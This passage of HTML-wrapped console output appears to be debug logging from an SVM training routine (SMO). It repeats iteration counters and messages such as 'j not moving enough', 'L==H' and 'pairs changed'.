class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 9</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 9 i:55, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 1 i:69, pairs changed 1</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 9</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 10</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 11</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 12</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 13</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 14</div><div class="line">j not moving enough</div><div class="line">iter: 14 i:29, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">iter: 8 i:52, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">iter: 0 i:17, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 9</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 10</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 10 i:55, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 9</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 10</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 11</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 12</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 13</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 14</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 15</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 16</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 17</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 18</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 19</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 20</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 21</div><div class="line">j not moving enough</div><div class="line">iter: 21 i:52, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">iter: 7 i:17, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 9</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 10</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 11</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 12</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 13</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 14</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 15</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 16</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 17</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 18</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 19</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 20</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 21</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 22</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 23</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 24</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 25</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 26</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 27</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 28</div><div class="line">iter: 28 i:29, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 5 i:55, pairs changed 1</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 9</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 10</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 11</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 12</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 13</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 14</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 15</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 16</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 17</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 18</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 19</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 20</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 21</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 22</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 23</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 24</div><div class="line">j not moving enough</div><div class="line">L==H</div><div class="line">iter: 24 i:29, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">iter: 1 i:17, pairs changed 1</div><div class="line">iter: 1 i:29, pairs changed 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 9</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 10</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 11</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 12</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 13</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 14</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 15</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 16</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 17</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 17 i:55, pairs changed 1</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 3 i:54, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 9</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 10</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 11</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 12</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 13</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 14</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 15</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 16</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 17</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 18</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 19</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 20</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 21</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 22</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iter: 22 i:55, pairs changed 1</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">iter: 3 i:52, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 9</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 10</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 11</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 12</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 13</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 14</div><div class="line">j not moving enough</div><div class="line">iter: 14 i:54, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">iter: 3 i:17, pairs changed 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 0</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 1</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 2</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 3</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 4</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 5</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 6</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 7</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 8</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 9</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 10</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 11</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 12</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 13</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 14</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 15</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 16</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 17</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 18</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 19</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 20</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 21</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 22</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 23</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 24</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 25</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 26</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 27</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 28</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 29</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 30</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 31</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 32</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 33</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 34</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 35</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 36</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 37</div><div class="line">j not moving enough</div><div class="line">j not moving enough</div><div class="line">iteration number: 